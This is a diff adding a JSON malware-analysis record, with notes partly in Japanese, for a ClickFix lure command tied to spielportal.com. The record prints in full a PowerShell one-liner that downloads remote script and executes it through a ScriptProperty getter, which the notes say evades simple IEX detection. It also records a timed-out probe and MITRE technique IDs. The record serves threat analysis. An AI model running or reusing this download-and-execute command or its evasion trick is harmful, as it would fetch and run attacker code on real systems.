@@ -1,0 +1,92 @@
+{
+  "schema_version": 1,
+  "case_id": "20260825-command-pt5-pt6-pt7",
+  "analysis_date": "2026-08-25",
+  "domain": "spielportal.com",
+  "source": {
+    "path": "C:\\Users\\Administrator\\Desktop\\kentai\\clickfix-command.txt",
+    "sha256": "8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0",
+    "captured_labels": [
+      "pt5",
+      "pt6",
+      "pt7"
+    ],
+    "file_last_write_local": "2026-08-25T00:06:47.081740+09:00"
+  },
+  "command": {
+    "raw": "powershell -c \"$a=irm 'spielportal.com/cj5JpRGuScm5B9ok7';$o=[pscustomobject]@{v=1};$o|Add-Member ScriptProperty p ([ScriptBlock]::Create($a));$o.p|Out-Null\"",
+    "sha256": "5b991f36902bf1f536bcc3e43298e4b7f78fb95184d88dfeaf4cd6f3cf590fff",
+    "length": 157,
+    "duplicate_count": 3,
+    "pattern": "Invoke-RestMethod + 動的ScriptProperty getter",
+    "deobfuscated": null,
+    "stage_locator_raw": "spielportal.com/cj5JpRGuScm5B9ok7",
+    "stage_url_normalized": "https://spielportal.com/cj5JpRGuScm5B9ok7",
+    "status": "recovered_not_executed",
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": [
+      {
+        "sequence": 1,
+        "image": "powershell.exe",
+        "evidence": "static_command_semantics",
+        "relationship": "candidate_not_executed"
+      }
+    ],
+    "process_chain_status": "recovered_from_command_not_executed",
+    "command_line_public": "powershell -c \"$a=irm 'spielportal.com/cj5JpRGuScm5B9ok7';$o=[pscustomobject]@{v=1};$o|Add-Member ScriptProperty p ([ScriptBlock]::Create($a));$o.p|Out-Null\"",
+    "command_line_normalized": "powershell -c \"$a=irm 'spielportal.com/cj5JpRGuScm5B9ok7';$o=[pscustomobject]@{v=1};$o|Add-Member ScriptProperty p ([ScriptBlock]::Create($a));$o.p|Out-Null\"",
+    "command_line_length": 157,
+    "command_line_status": "recovered_not_executed",
+    "command_line_source": "analyst_provided_clickfix_command_file",
+    "command_sha256": "5b991f36902bf1f536bcc3e43298e4b7f78fb95184d88dfeaf4cd6f3cf590fff"
+  },
+  "process_analysis": {
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": "利用者起点（Run dialogまたは既存shell） → powershell.exe → ScriptBlock.Create → ScriptProperty getter評価（同一process）",
+    "status": "static_candidate_not_observed",
+    "details": [
+      "pt5、pt6、pt7はbyte単位で同一である。",
+      "irm応答を$aへ保持し、[ScriptBlock]::Create($a)でscript blockへ変換する。",
+      "Add-Member ScriptPropertyでgetter pとして登録し、$o.pのproperty readを実行triggerにする。",
+      "iex文字列を使わずに任意PowerShellを実行する間接評価であり、単純なIEX検知を回避する。",
+      "取得文字列はschemeを省略している。"
+    ]
+  },
+  "retrieval": {
+    "analyst_probe_url": "https://spielportal.com/cj5JpRGuScm5B9ok7",
+    "status": "timeout",
+    "http_status": null,
+    "bytes": 0,
+    "body_sha256": null,
+    "body_type": null,
+    "payload_recovered": false,
+    "evidence_role": "current_context_only_not_runtime_proof",
+    "javascript_executed": false,
+    "powershell_executed": false,
+    "payload_executed": false
+  },
+  "terminal_payload": {
+    "status": "not_retrieved",
+    "family": null,
+    "sha256": null,
+    "additional_processes": [],
+    "persistence": [],
+    "final_attacker_command": null
+  },
+  "techniques": [
+    "T1204.004",
+    "T1059.001",
+    "T1027",
+    "T1105"
+  ],
+  "safety": {
+    "captured_command_executed": false,
+    "downloaded_script_executed": false,
+    "payload_executed": false,
+    "network_method": "bounded GET only"
+  }
+}
